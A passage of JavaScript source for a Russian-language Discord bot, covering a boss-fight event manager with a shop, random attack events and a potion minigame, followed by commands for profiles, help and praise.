    collector.on("end", () => message.delete());
  }

  static async beforeApparance(guild){
    // Delevop crutch!
    if (!["628993637530992650", "752898200993660959"].includes(guild.id)){
      return;
    }
    const data = guild.data;

    if (!data.boss){
      return;
    }

    const now = new Date();

    const isApparanceAtNextDay = () => {
      return data.boss.apparanceAtDay + 1 === data.bot.currentDay;
    }

    if (!isApparanceAtNextDay()){
      return;
    }

    await delay(3000);

    const descriptionImage = `Настоящий босс — это здравый смысл внутри каждого из нас. И всем нам предстоит с ним сразится.`;
    const descriptionFacts = `С завтрашенего дня, в течении трёх дней, босс будет проходить по нашим землям в определенном образе. За это время мы должны нанести как можно больше урона.\nПосле его появления на сервере будет доступна команда **!босс**`;
    const description = `${ descriptionImage }\n\n${ descriptionFacts }`;

    const embed = {
      color: "210052",
      title: "",
      description
    }
 
    await guild.chatSend(embed.title, embed);
  }

  static async beforeEnd(guild){
    const boss = guild.data.boss;

    if (boss.level > 1 === false){
      guild.chatSend("Босс покинул сервер в страхе...");
      return;
    }
    

    const contents = {
      dice: `Максимальный бонус к урону от кубика: Х${ +((boss.diceDamageMultiplayer ?? 1) - 1).toFixed(2) };`,
      damageDealt: `Совместными усилиями участники сервера нанесли ${ boss.damageTaken } единиц урона`,
      usersCount: `Приняло участие: ${ ending(Object.keys(boss.users).length, "человек", "", "", "а") }`,
      parting: boss.level > 3 ? "Босс остался доволен.." : "Босс недоволен..",
      rewards: "Награды:"
    }
    
    const getUsetsRewardTable = () => {
      const table = {};
      const rewardsCount = Math.floor(boss.level ** 1.2);
      const usersOdds = Object.entries(boss.users)
        .map(([id, {damageDealt: _weight}]) => ({id, _weight}));
        
      for (let i = 0; i < rewardsCount; i++){
        const id = usersOdds.random({_weight: true})
          .id;
        
        table[id] ||= 0;
        table[id] += 1;
      }
      
      return table;
    }
   
    const usersTable = getUsetsRewardTable();
    
    Object.entries(usersTable).forEach(([id, voidCount]) => {
      const user = client.users.cache.get(id);
      user.data.void += voidCount;
    })

    const fields = Object.entries(usersTable).map(([id, voidCount]) => {
      const user = client.users.cache.get(id);
      const damage = boss.users[id].damageDealt;
      const value = `Нестабильности: ${ voidCount };\nУрона: ${ damage }ед.`;
      return {name: user.username, value, inline: true};
    });
      
    

    const description = `${ contents.dice }\n\n${ contents.damageDealt }. ${ contents.usersCount }. ${ contents.parting }`;
    const embed = {
      message: "Среди ночи босс покинул этот сервер",
      description,
      fields
    };
    guild.chatSend(embed);
  }

  static initBossData(boss, guild){
    boss.level = 1;
    boss.users = {};
    boss.isArrived = true;
    boss.damageTaken = 0;
    boss.type = this.BOSS_TYPES.random();

    boss.guildId = guild.id;
    boss.healthThresholder = BossManager.calculateHealthPointThresholder(boss.level);
  }

  static userAttack({boss, user, channel}){
    const userStats = BossManager.getUserStats(boss, user.id);
    
    userStats.attack_CD ||= 0;
    userStats.attackCooldown ||= this.USER_DEFAULT_ATTACK_COOLDOWN;

    const footer = {iconURL: user.avatarURL(), text: user.tag};
    if (userStats.attack_CD > Date.now()){
      const description = `**${ timestampToDate(userStats.attack_CD - Date.now()) }**. Дождитесь подготовки перед атакой.`;
      channel.msg("⚔️ Перезарядка..!", {color: "ff0000", description, delete: 7000, footer});
      return;
    }

    
    userStats.attack_CD = Date.now() + userStats.attackCooldown;

    
    const attackContext = {
      damageMultiplayer: 1,
      listOfEvents: []
    };
    const pull = [...BossManager.eventBases.values()];
    const data = {user, userStats, boss, channel, attackContext};
    const eventsCount = Math.floor(boss.level ** 0.5) + random(-1, 1);
 
    for (let i = 0; i < eventsCount; i++){
      for (const event of pull){
        const needSkip = event.filter && !event.filter(data);
        
        if (needSkip){
          const index = pull.indexOf(event);
          (~index) ? pull.splice(index, 1) : null;
        }
      };

      const event = pull.random({weights: true});
      if (!event){
        break;
      }
      if (!event.repeats){
        const index = pull.indexOf(event);
        ~index ? pull.splice(index, 1) : null;
      }

      try {
        event.callback(data);
      }
      catch (error){
        channel.msg(`Источник исключения: ${ event.id }. Он был убран из списка возможных событий на неопределенный срок`, {color: "", description: `**${ error.message }:**\n${ error.stack }`});
        BossManager.eventBases.delete(event.id);
      }
      attackContext.listOfEvents.push(event);
    }

    const damage = Math.ceil((userStats.attacksDamageMultiplayer ?? 1) * this.USER_DEFAULT_ATTACK_DAMAGE * attackContext.damageMultiplayer);
    attackContext.defaultDamageDealt = attackContext.damageDealt = damage;
    BossManager.makeDamage(boss, damage, {sourceUser: user});

    

    const eventsContent = attackContext.listOfEvents.map(event => `・ ${ event.description }.`).join("\n");
    const description = `Нанесено урона с прямой атаки: ${ damage }ед.\n\n${ eventsContent }`;
    const embed = {
      message: `⚔️ За сервер ${ channel.guild.name }!`,
      description,
      footer
    }
    channel.msg(embed);
  }

  static async createShop({guild, channel, user}){
    const boss = guild.data.boss;
    const ITEMS = new Collection(Object.entries({
      "🧩": {
        emoji: "🧩",
        keyword: "puzzle",
        description: "Множитель атаки: 1.25",
        basePrice: 100,
        priceMultiplayer: 2,
        callback: ({userStats}) => {
          const multiplier = 1.25;
          userStats.attacksDamageMultiplayer = +(
            (userStats.attacksDamageMultiplayer ?? 1) *
            multiplier
          ).toFixed(3);
        }
      },
      "🐺": {
        emoji: "🐺",
        keyword: "wolf",
        description: "Перезарядка атаки в 2 раза меньше",
        basePrice: 50,
        priceMultiplayer: 1.75,
        callback: ({userStats}) => {
          userStats.attackCooldown ||= this.USER_DEFAULT_ATTACK_COOLDOWN;
          userStats.attackCooldown = Math.floor(userStats.attackCooldown / 2);

          userStats.attack_CD -= userStats.attackCooldown;
        }
      },
      "🥛": {
        emoji: "🥛",
        keyword: "milk",
        description: "Снимает негативные и нейтральные эффекты",
        basePrice: 200,
        priceMultiplayer: 3,
        callback: ({userStats}) => {
          if (!userStats.effects){
            return false;
          }
          const toRemove = userStats.effects
            .filter(effect => {
              const base = BossManager.effectBases.get(effect.id);
              return base.influence === "negative" || base.influence === "neutral";
            });

          while (toRemove.length){
            const effect = toRemove.pop();
            const index = userStats.effects.indexOf(effect);
            if (~index){
              userStats.effects.splice(index, 1);
            }
          };
        }
      },
      "📡": {
        emoji: "📡",
        keyword: "anntena",
        description: "На 1 больше урона за сообщение",
        basePrice: 1000,
        priceMultiplayer: 2,
        callback: ({userStats}) => {
          userStats.damagePerMessage ||= 1;
          userStats.damagePerMessage += 1;
        },
      },
      "🎲": {
        emoji: "🎲",
        keyword: "dice",
        description: "Урон участников сервера на 1% эффективнее",
        basePrice: 10,
        priceMultiplayer: 5,
        callback: ({boss}) => {
          boss.diceDamageMultiplayer ||= 1;
          boss.diceDamageMultiplayer += 0.01;
        },
      },
      "🪦": {
        emoji: "🪦",
        keyword: "headstone",
        description: "Полностью сбрасывает персонажа",
        basePrice: 300,
        priceMultiplayer: 10,
        callback: ({boss, user, userStats}) => {
          const keyword = "headstone";
          const currentBought = userStats.bought?.[keyword] ?? 0;

          delete boss.users[user.id];
          message.delete();

          userStats = BossManager.getUserStats(boss, user.id);
          userStats.bought = {[keyword]: currentBought};
        }
      }
      
    }));
    const createEmbed = ({boss, user, edit}) => {
      const data = user.data;

      const productsContent = ITEMS
        .map((item) => `${ item.emoji } — ${ item.description }.\n${ calculatePrice(item, userStats.bought[item.keyword]) };`)
        .join("\n");

      const description = `Приобретите эти товары! Ваши экономические возможности: ${ ending(data.coins, "монет", "", "а", "ы") } <:coin:637533074879414272> на руках\n\n${ productsContent }`;

      return {
        message: "Тайная лавка Гремпенса",
        author: {name: user.username, iconURL: user.avatarURL()},
        description,
        edit,
        reactions: edit ? [] : [...ITEMS.map(({emoji}) => emoji)]
      };
    }

    const userStats = BossManager.getUserStats(boss, user.id);
    userStats.bought ||= {};

    const calculatePrice = (item, boughtCount) => {
      const grossPrice = item.basePrice * item.priceMultiplayer ** (boughtCount ?? 0);
      const price = Math.floor(grossPrice - (grossPrice % 5));
      return price;
    }
    
    let message = await channel.msg( createEmbed({boss, user, edit: false}) );
    const collector = message.createReactionCollector((reaction, member) => user.id === member.id, {time: 60_000});

    collector.on("collect", async (reaction, user) => {
      reaction.users.remove(user);
      const product = ITEMS.get(reaction.emoji.name);
      const currentBought = userStats.bought[ product.keyword ] ?? 0;
      const price = calculatePrice(product, currentBought);

      if (user.data.coins < price){
        message.msg("Недостаточно средств!", {delete: 3000});
        reaction.remove();
        return;
      }

      product.callback({ user, userStats, boss });
      userStats.bought[ product.keyword ] = currentBought + 1;
      user.data.coins -= price;
      message.msg("", {description: `${ product.emoji } +1`, delete: 7000})
      message = await message.msg( createEmbed({boss, user, edit: true}) );
    });
    
    collector.on("end", () => message.reactions.removeAll());

  }

  static eventBases = new Collection(Object.entries({
    increaseAttackCooldown: {
      _weight: 5,
      id: "increaseAttackCooldown",
      description: "Перезарядка атаки больше на 20 минут",
      callback: ({userStats}) => {
        userStats.attackCooldown ||= this.USER_DEFAULT_ATTACK_COOLDOWN;
        const adding = 60_000 * 20
        userStats.attackCooldown += adding;
        userStats.attack_CD += adding;
      },
      filter: ({attackContext}) => 
        !attackContext.listOfEvents.some(({id}) => ["reduceAttackDamage"].includes(id))      
    },
    increaseCurrentAttackDamage: {
      _weight: 15,
      repeats: true,
      id: "increaseAttackCooldown",
      description: "Урон текущей атаки был увеличен",
      callback: ({attackContext}) => {
        attackContext.damageMultiplayer *= 5;
      }     
    },
    giveChestBonus: {
      _weight: 4,
      id: "giveChestBonus",
      description: "Выбито 4 бонуса сундука",
      callback: ({user}) => {
        user.data.chestBonus = (user.data.chestBonus ?? 0) + 4;
      }     
    },
    applyCurse: {
      _weight: 3,
      id: "applyCurse",
      description: "Вас прокляли",
      callback: ({user, boss}) => {
        const hard = Math.min(
          Math.floor(boss.level / 3),
          2
         );
        const curse = CurseManager.generate({user, hard});
        CurseManager.init({user, curse});
      },
      filter: ({user}) => !user.data.curses?.length || user.data.voidFreedomCurse     
    },
    improveDamageForAll: {
      _weight: 5,
      id: "improveDamageForAll",
      description: "Урон по боссу увеличен на 1%",
      callback: ({user, boss}) => {
        boss.diceDamageMultiplayer += 0.01;
      },
      filter: ({boss}) => boss.diceDamageMultiplayer 
    },
    choiseAttackDefense: {
      _weight: 2,
      id: "choiseAttackDefense",
      description: "Требуется совершить выбор",
      callback: async ({user, boss, channel, userStats}) => {
        const reactions = ["⚔️", "🛡️"];
        const embed = {
          message: "",
          author: {name: user.username, iconURL: user.avatarURL()},
          description: "Вас атакуют!\n— Пытаться контратаковать\n— Защитная поза",
          reactions,
          footer: {iconURL: user.avatarURL(), text: "Вы можете проигнорировать это сообщение"}
        }

        channel.startTyping();
        await delay(2000);
        channel.stopTyping();

        const message = await channel.msg(embed);
        const collector = message.createReactionCollector(({emoji}, member) => user === member && reactions.includes(emoji.name), {time: 30_000, max: 1});
        collector.on("collect", (reaction) => {
          const isLucky = random(0, 1);
          const emoji = reaction.emoji.name;

          if (emoji === "⚔️" && isLucky){
            const content = "Успех! Нанесено 125 урона";
            message.msg("", {description: content});
            BossManager.makeDamage(boss, 125, {sourceUser: user});
            return;
          }

          if (emoji === "⚔️" && !isLucky){
            const content = "После неудачной контратаки ваше оружие ушло на дополнительную перезарядку";
            message.msg("", {description: content});
            userStats.attack_CD += 3_600_000;
            return;
          }

          if (emoji === "🛡️" && isLucky){
            const content = "Успех! Получено 1000 золота";
            message.msg("", {description: content});
            user.data.coins += 1000;
            return;
          }

          if (emoji === "🛡️" && !isLucky){
            const content = "После неудачной защиты ваше оружие ушло на дополнительную перезарядку";
            message.msg("", {description: content});
            userStats.attack_CD += 3_600_000;
            return;
          }
        });

        collector.on("end", () => message.delete());
      }
    },
    choiseCreatePotion: {
      _weight: 1,
      id: "choiseCreatePotion",
      description: "Требуется совершить выбор",
      callback: async ({user, boss, channel, userStats, attackContext}) => {
        const reactions = ["🧪", "🍯", "🩸"];
        const embed = {
          message: "",
          author: {name: user.username, iconURL: user.avatarURL()},
          description: "Сварите правильный эликсир\n— 🧪 Добавить больше порошка\n— 🍯 Подсыпать пудры\n— 🩸 Средство для усиления эффекта",
          reactions,
          footer: {iconURL: user.avatarURL(), text: "Используйте три реакции для наилучшего эффекта"}
        }

        channel.startTyping();
        await delay(2000);
        channel.stopTyping();

        const ingredients = [];

        const createSpell = (ingredients) => {
          const spellsTable = {
            "🧪🧪🧪": {
              description: "Создаёт особый котёл, который уменьшает перезарядку атаки каждого, кто использует его. Однако его длительность ограничена одним часом или пятью использованиями!",
              callback: async (message, _embed) => {
                await message.react("🧪");
                const collector = message.createReactionCollector(() => true, {time: 3_600_000});
                const gotTable = {};
                collector.on("collect", (_reaction, user) => {
                  if (user.id in gotTable){
                    message.msg("Вы уже воспользовались котлом", {color: "ff0000", delete: 3000});
                    return;
                  }

                  if (Object.keys(gotTable) >= 5){
                    collector.stop();
                  }

                  gotTable[user.id] = true;
                  const userStats = BossManager.getUserStats(boss, user.id);
                  const current = userStats.attackCooldown;
                  userStats.attackCooldown = Math.floor(userStats.attackCooldown * 0.80);

                  const description = `Кулдаун снизился на ${ timestampToDate(current - userStats.attackCooldown) }`;
        
                  message.msg("", {description, footer: {iconURL: user.avatarURL(), text: user.tag}, delete: 8000});
                });

                collector.on("end", () => message.reactions.removeAll());
              }
            },
            "🧪🧪🍯": {
              description: "Создаёт особый котёл, который дарует богатсва каждому, кто использует его. Однако его длительность ограничена одним часом или пятью использованиями!",
              callback: async (message, _embed) => {
                await message.react("🧪");
                const collector = message.createReactionCollector(() => true, {time: 3_600_000});
                const gotTable = {};
                collector.on("collect", (_reaction, user) => {
                  if (user.id in gotTable){
                    message.msg("Вы уже воспользовались котлом", {color: "ff0000", delete: 3000});
                    return;
                  }

                  if (Object.keys(gotTable) >= 5){
                    collector.stop();
                  }

                  gotTable[user.id] = true;

                  user.data.chestBonus ||= 0;
                  user.data.chestBonus += 7;
                  const description = `Получено 7 бонусов сундука`;
        
                  message.msg("", {description, footer: {iconURL: user.avatarURL(), text: user.tag}, delete: 8000});
                });

                collector.on("end", () => message.reactions.removeAll());
              }
            },
            "🧪🧪🩸": {
              description: "Сбрасывает перезарядку на атаку и уменьшает постоянный кулдаун в полтора раза",
              callback: (_message, _embed) => {
                delete userStats.attack_CD;
                userStats.attackCooldown = Math.floor(userStats.attackCooldown / 1.5);
              }
            },
            "🧪🍯🍯": {
              description: "Значительно уменьшает цену на волка из лавки босса",
              callback: (_message, _embed) => {
                userStats.bought ||= {};
                userStats.bought.wolf ||= 0;
                userStats.bought.wolf -= 2;
              }
            },
            "🧪🩸🩸": {
              description: "Значительно уменьшает цену на пазл из лавки босса",
              callback: (_message, _embed) => {
                userStats.bought ||= {};
                userStats.bought.puzzle ||= 0;
                userStats.bought.puzzle -= 2;
              }
            },
            "🍯🍯🍯": {
              description: "Вы мгновенно получаете 35 бонусов сундука!",
              callback: (_message, _embed) => {
                user.data.chestBonus ||= 0;
                user.data.chestBonus += 35;
              }
            },
            "🩸🩸🩸": {
              description: "Босс теряет 10% от своего текущего здоровья",
              callback: (message, embed) => {
                const thresholder = BossManager.calculateHealthPointThresholder(boss.level);
                const currentHealth = thresholder - boss.damageTaken;
                const damage = Math.floor(currentHealth * 0.10);
                BossManager.makeDamage(boss, damage, {sourceUser: user});

                embed.edit = true;
                embed.author = {name: `Нанесено ${ damage }ед. урона`};
                message.msg(embed);
              }
            },
            "🧪🍯🩸": {
              description: "Вы попросту перевели продукты..",
              callback: (_message, _embed) => {

              }
            },
            "🍯🍯🩸": {
              description: "Вы попросту перевели продукты..",
              callback: (_message, _embed) => {

              }
            },
            "🍯🩸🩸": {
              description: "Наносит ещё одну атаку с увеличенным уроном. Множитель урона Х4",
              callback: (message, embed) => {
                const previousDamage = attackContext.damageDealt;
                const damage = previousDamage * 4;
                BossManager.makeDamage(boss, damage, {sourceUser: user});

                embed.edit = true;
                embed.author = {name: `Нанесено ${ damage }ед. урона`};
                message.msg(embed);
              }
            }
          }

          const sort = (a, b) => reactions.indexOf(a) > reactions.indexOf(b) ? 1 : -1;

          const key = ingredients.sort(sort).join("");
          const {callback, description} = spellsTable[key];
          return {callback, description};
        }


        const message = await channel.msg(embed);
        const collector = message.createReactionCollector(({emoji}, member) => user === member && reactions.includes(emoji.name), {time: 90_000});
        collector.on("collect", async (reaction, user) => {
          reaction.users.remove(user);

          const emoji = reaction.emoji.name;

          

          ingredients.push(emoji);
          const MAX_INGEDIENTS = 3;

          const ingredientsContent = `[__${ ingredients.join("") }__] + ${ ingredients.length }/${ MAX_INGEDIENTS }`;
          await channel.msg("", {description: ingredientsContent, delete: 3000});

          


          if (ingredients.length === MAX_INGEDIENTS){
            collector.stop();

            if (!random(0, 15)){
              const description = "Вы попросту перевели ресурсы, варево неудалось";
              channel.msg("Мухомор, пудра, утконос", {description, footer: {iconURL: user.avatarURL(), text: user.tag}});
              return;
            }

            const {callback, description} = createSpell(ingredients);
            const embed = {
              message: "Трепещи, босс, я изобрёл нечто!",
              description,
              footer: {iconURL: user.avatarURL(), text: user.tag}
            }
            const message = await channel.msg(embed);
            callback.call(null, message, embed);
          }

        });

        collector.on("end", () => message.delete());
      }
    }
    // ______e4example: {
    //   _weight: 2,
    //   id: "______e4example",
    //   description: "Требуется совершить выбор",
    //   callback: async ({user, boss, channel, userStats}) => {
    //   }
    // }

  }));

  static BOSS_TYPES = new Collection([

  ].map((type, index) => [index, type]));

  static USER_DEFAULT_ATTACK_COOLDOWN = 3_600_000 * 2;
  static USER_DEFAULT_ATTACK_DAMAGE = 10;
}




//---------------------------------{#Objects--}------------------------------



const commands = {
  delete: new Command(async (msg, op) => {
    if (!op.args) {
      return;
    }

    msg.msg("", {description: "Эта бонусная функция доступна только для пользователей поддерживающих нас :green_heart: \nХотите быть одним из них? [**Поддержите нас!**](https://www.youtube.com/watch?v=MX-CO5i5S9g)"});
  }, {name: "delete", cooldown: 5, try: 2, type: "other"}, "удалить удали"),

  send: new Command(async (msg, op) => {
      let message = await msg.msg(`**${op.args}**`, {embed: true});
      if (message.content === "****"){
        message.edit("\\*Слишком пустое сообщение\\*");
      }
      msg.guild.logSend(msg.author.username + ":", {description: "\n!c " + op.args});
  }, {args: true, delete: true, myChannelPermissions: 8192, type: "other"}, "с c сенд s"),

  user: new Command(async (msg, op) => {
    

    const
      memb   = (op.args) ? op.memb || client.users.cache.get(op.args) || msg.author : msg.author,
      member = (msg.guild) ? msg.guild.member(memb) : null,
      user   = memb.data,
      guild  = msg.guild;

      const commandContext = {
        currentCurseView: 0,
  
        rank: {
          position: null,
          members: guild ?
            guild.members.cache.map(m => m.user)
              .filter(user => !user.bot)
              .filter(user => user.data.level > 1)
            : null
        },
        
        status: null,
        embedColor: user.profile_color || "RANDOM",
        controller: {
          message: null,
          editEmbed: false,
          reactions: ["640449832799961088"]
        }
        
      };


      if (guild && member === undefined){
        msg.msg("На сервере нет упомянутого пользователя", {color: "ff0000", delete: 9000});
        return;
      }

      msg.author.action("callUserCommand", {msg, op});

      if (member && user.level > 1) {
        commandContext.rank.position = [...commandContext.rank.members.values()]
          .sort((b, a) => (a.data.level != b.data.level) ? a.data.level - b.data.level : a.data.exp - b.data.exp)
          .indexOf(member) + 1;
      }

      if (
        memb.presence.status != "offline" ||
        memb === msg.author
      ) {
        commandContext.status = "<:online:637544335037956096> В сети";
      }
      else {
         const lastOnline = getTime() - nonNaN(user.last_online);
         const getDateContent = () => (31556926000000 < lastOnline) ? "более года" : (lastOnline > 2629743000) ? "более месяца" : timestampToDate(lastOnline);
         const dateContent = user.profile_confidentiality ? "" : getDateContent();
         commandContext.status = `<:offline:637544283737686027> Не в сети ${ dateContent }`;
      }

      memb.quest("check");


      const createEmbedAtFirstPage = async () => {
        const description = `Коинов: **${ Math.letters(user.coins) }**<:coin:637533074879414272> \n <a:crystal:637290417360076822>Уровень: **${user.level || 1}** \n <:crys:637290406958202880>Опыт: **${user.exp || 0}/${(user.level || 1) * 45}**\n\n ${commandContext.status}\n`

        const embed = {
          message: "Профиль пользователя",
          author: {
            name: `#${ member ? member.displayName : memb.username }`,
            iconURL: memb.avatarURL({dynamic : true})
          },
          color: commandContext.embedColor,
          edit: commandContext.controller.editEmbed,
          description,
          fields: [{name: " ᠌", value: " ᠌"}],
          footer: {text: `Похвал: ${user.praiseMe?.length || "0"}   ${commandContext.rank ? `Ранг: ${commandContext.rank.position}/${ commandContext.rank.members.length }` : ""}`},
        }

        

        if (user.profile_description){
          about = await template(user.profile_description, msg);
          embed.fields.push({name: "О пользователе: ᠌", value: about});
        }
          
        if (member){
          const secretAchievements = [{emoji: "👑", property: "crown"}, {emoji: "❄️", property: "voidIce"}]
            .filter(({property}) => property in user);

          const achiementContent = secretAchievements.last ? secretAchievements.random().emoji + " " : "";
          embed.fields.push({name: " ᠌᠌", value: "\n**" + `${ achiementContent }${ member.roles.highest }**\nᅠ`});
        }

        if (!memb.bot){
          const value = user.quest ? `${ quests[user.quest] } ${ user.questProgress || 0 }/${ user.questNeed }` : " – Квест выполнен";
          embed.fields.push({name:"\nКвест:", value});
        }

        if (user.curses && user.curses.length){
          const content = user.curses.map(curse => `・${ curse.values.progress || 0 }/${ curse.values.goal }`).join("; ");
          embed.fields.push({name: "᠌᠌", value: `Прогресс проклятия: ${ content }`});
        }
        
        return embed;
      }


      const createEmbedAtSecondPage = async () => {
        const footer = member ?
          {text: `На сервере с ${new Intl.DateTimeFormat("ru-ru", {day: "numeric", year: "numeric", month: "long"}).format(member.joinedTimestamp)}`} :
          null;

        const embed = {
          message: `Статистика ${ memb.tag }`,
          color: commandContext.embedColor,
          footer,
          edit: commandContext.controller.editEmbed
        }

        const contents = [];

        const inventory = [
          `🔩${user.keys}`,
          `<a:void:768047066890895360>${user.void}`,
          `🧤${ user.thiefGloves || 0 }|${ (user.thiefWins && String(user.thiefWins).replace("-", "!")) || 0 }`,
          `${ user.chilli  ? "🌶️" + user.chilli  : "" }`,
          `${ user.monster ? "🐲" + user.monster : "" }`,
          `${ user.seed    ? "🌱" + user.seed    : "" }`,
          `${ user.cheese  ? "🧀" + user.cheese  : "" }`
        ];

        if (user.element){
          const emoji = ["🍃 Земля", "☁️ Воздух", "🔥 Огонь", "👾 Тьма"][user.element];
          const content = `\n${ emoji } — элемент ${nonNaN(user.elementLevel) + 1} ур.\n`;
          contents.element = content;
        }

        const fields = [
          {
            name: "Клубники <:berry:756114492055617558>",
            value: `Имеется: ${ user.berrys }`,
            inline: true
          },
          {
            name: `Сундук ${ user.CD_32 > getTime() ? "<:chest_opened:986165753843679232>" : "<a:chest:805405279326961684>" }`,
            value: `Сундук ур.: ${user.chestLevel + 1}\nБонус след. открытия: \`${user.chestBonus || 0}\``,
            inline: true
          },
          {
            name: "Содержимое сумки",
            value: `${inventory.join("  ")}${ contents.element }\n⠀`,
            inline: false
          },
          {
            name: "Выполнено квестов 📜",
            value: `Ежедневных: ${memb.bot ? "BOT" : user.dayQuests || 0}\nГлобальных: ${(user.completedQuest || []).filter(e => e in quests.names).length}/${Object.values(quests.names).length}`,
            inline: false
          },
          {
            name: "Проклятия 💀",
            value: (() => {
              const surviveContent = `Пережито проклятий: ${ user.cursesEnded || 0 }`;
              const getCurrentContent = () => {
                if (!user.curses || !user.curses.length){
                  return "Проклятия отсуствуют.";
                }
                
                const count = ending(user.curses.length, "", `Текущие проклятия (их ${ user.curses.length })`, "Текущее проклятие", "Текущие два проклятия", {slice: true});
                const curse = user.curses.at(commandContext.currentCurseView);
                const description = CurseManager.intarface({user: memb, curse}).toString();
                return `>>> ${ count }:\n${ description }`
              }
              return `${ surviveContent }\n${ getCurrentContent() }`;
            })(),
            inline: false,
            filter: () => user.cursesEnded || user.curses
          },
          {
            name: "Бонусы котла <a:placeForVoid:780051490357641226>",
            value: `\`\`\`Уменьшений кулдауна: ${ ~~user.voidCooldown }/20\nСкидок на котёл: ${~~user.voidPrise}/5\nНестабилити: ${~~user.voidDouble}/1\nУсиление квестов: ${~~user.voidQuests}/5\nШанс коина: ${~~user.voidCoins}/7 (${+(1 / (85 * 0.90 ** user.voidCoins) * 100).toFixed(2)}%)\nМонстр-защитник: ${~~user.voidMonster}/1\nКазино: ${~~user.voidCasino}/1\nБонусы от перчаток: ${~~user.voidThief}\nУмение заворож. Клевер: ${nonNaN(user.voidMysticClover)}\nФермер: ${nonNaN(user.voidTreeFarm)}\nНаграда коин-сообщений: ${35 + (user.coinsPerMessage || 0)}\`\`\``,
            inline: false
          }
        ];

        embed.fields = fields.filter(field => !field.filter || field.filter());
        return embed;
      }



     

      const controller = commandContext.controller;
      controller.message = await msg.msg( await createEmbedAtFirstPage() );
      controller.editEmbed = true;

      while (true) {
        delay(8500);

        const react = await controller.message.awaitReact({user: "any", type: "all", time: 20000}, ...controller.reactions);
        switch (react) {
          case "640449848050712587":
            commandContext.currentCurseView = commandContext.currentCurseView + 1 % user.curses.length;
            await controller.message.msg( await createEmbedAtFirstPage() );
            controller.reactions = ["640449832799961088"];
            break;
          case "640449832799961088":
            await controller.message.msg( await createEmbedAtSecondPage() );
            controller.reactions = ["640449848050712587"];
            break;

          default: return;
        }
      }
  }, {delete: true, cooldown: 20, try: 3, type: "user"}, "юзер u ю profile профиль"),

  help: new Command(async (msg, op) => {
    let endingIndex = Object.values(commands).findIndex((e, i) => i != 0 && e.id === 1);
    let guildCommands = [];

    if (msg.guild.data.commands) {
      guildCommands.push({
        name: "Кастомные команды <:cupS:806813704913682442>",
        value: Object.keys(msg.guild.data.commands).map(e => `\`!${e}\``).join(" ")
      });
    }

    let fields = [
      {
        name: "Управление сервером <a:diamond:725600667586134138>",
        value: Object.entries(commands).filter(([k, v], i) => v.type === "guild" && i < endingIndex && !v.hidden).map(([k, v]) => `\`!${k}\``).join(" ")
      },
      {
        name: "Пользователи <:berry:756114492055617558>",
        value: Object.entries(commands).filter(([k, v], i) => v.type === "user" && i < endingIndex && !v.hidden).map(([k, v]) => `\`!${k}\``).join(" ")
      },
      {
        name: "Бот <:piggeorg:758711403027759106>",
        value: Object.entries(commands).filter(([k, v], i) => v.type === "bot" && i < endingIndex && !v.hidden).map(([k, v]) => `\`!${k}\``).join(" ")
      },
      ...guildCommands,
      {
        name: "Другое <:coin:637533074879414272>",
        value: Object.entries(commands).filter(([k, v], i) => v.type === "other" && i < endingIndex && !v.hidden).map(([k, v]) => `\`!${k}\``).join(" ")
      }
    ];


    // msg.msg("Команды, которые не сломают ваш сервер", {description: "Знаете все-все мои возможности? Вы точно молодец!", fields});
    client.api.channels(msg.channel.id).messages.post({data: {
      "embed": {
        "title": "Команды, которые не сломают ваш сервер",
        "color": 	65280,
        "description": `Знаете все-все мои возможности? Вы точно молодец!`,
        "fields": fields
      },
      "content": "",
      "components": [
        {
           "type": 1,
           "components": [
             {
                    "type": 2,
                    "label": "Discord",
                    "style": 5,
                    "url": "https://discord.gg/76hCg2h7r8",
                    "emoji": {id: "849587567564554281"}
              }
           ]
       }
      ]
    }});
  }, {delete: true, cooldown: 15, type: "other"}, "хелп помощь cmds commands команды х"),

  praise: new Command(async (msg, op) => {
    let
      memb     = op.memb,
      user     = op.user,
      membUser = memb.data;

    if (memb == msg.author) {
      msg.channel.msg("Выберите другую жертву объятий!", {author: {name: msg.author.username, iconURL: msg.author.avatarURL()}});
      return;
    }

    let heAccpet = await accept("praise", "Количество похвал ограничено\nПродолжить?", msg.channel, user);
    if (!heAccpet) {
      return;
    };

    user.praise = user.praise || [];
    if (user.praise.length > 1 + Math.floor(user.level * 1.5 / 10)) {
      msg.channel.msg("Вы использовали все похвалы", {color: "ff0000"});
      return;
    }

    membUser.praiseMe = membUser.praiseMe || [];
    if (user.praise.includes(memb.id)) {
      msg.channel.msg("Вы уже хвалили его!");
      return;
    }

    user.praise.push(memb.id);
    membUser.praiseMe.push(user.id);
    msg.channel.msg(`${memb.username} похвалили ${membUser.praiseMe.length}-й раз\nЭто сделал ${msg.author.username}!`, {author: {name: memb.username, iconURL: memb.avatarURL()}});

    msg.author.quest("like", msg.channel);
    memb.quest("praiseMe", msg.channel);
  }, {delete: true, memb: true, type: "user"}, "похвалить like лайк лайкнуть"),

  praises: new Command(async (msg, op) => {

    if (op.args === "+"){
      const data = msg.author.data;

      const currentPraises = data.praise || [];
      const currentLength = currentPraises.length;

      currentPraises.forEach(id => {
        const target = client.users.cache.get(id).data.praiseMe;
        if (!target)
          return;

        const index = target.indexOf( msg.author.id );
        if (index === -1)
          return;

        target.splice(index, 1);
      });

      data.praise = [];



      msg.msg("", {description: `Использован параметр "+" — все похвалы были удалены (${ currentLength })`, delete: 10000});
    }


    let
      memb = op.memb || msg.guild.members.cache.get(op.args) || msg.author,
      user = memb.data,
      isAuthor = memb == msg.author,
      iPraise  = (user.praise && user.praise.length) ? user.praise.map((id, i) => (i + 1) + ". "+ (getData(id) ? Discord.Util.escapeMarkdown( getData(id).name ) : "пользователь не определен")).join(`\n`) : (isAuthor) ? "Вы никого не хвалили \nиспользуйте **!похвалить**" : "Никого не хвалил",
      mePraise = (user.praiseMe && user.praiseMe.length) ? user.praiseMe.map((id, i) => (i + 1) + ". "+ (getData(id) ? Discord.Util.escapeMarkdown( getData(id).name ) : "пользователь не определен")).join(`\n`) : (isAuthor) ? "Вас никто не похвалил, напомните им это сделать" : "Его никто не хвалил, похвалите его!";

    const maximumPraises = Math.min(
      2 + Math.floor(user.level * 1.5 / 10),
      20
    );

    user.praise = user.praise || [];
    if ( user.praise[0] ) {
      iPraise += "\n• (пусто)".repeat( Math.max(maximumPraises - user.praise.length, 0) );
    }

    let message = await msg.channel.msg(isAuthor ? "Похвалы" : "Похвалил", {description: iPraise, color: "00ffaf", author: {name: memb.tag, iconURL: memb.avatarURL()}, footer: {text: isAuthor ? "Если вы хотите отменить,\nпохвалу кликните на *галочку* ниже." : ""}});
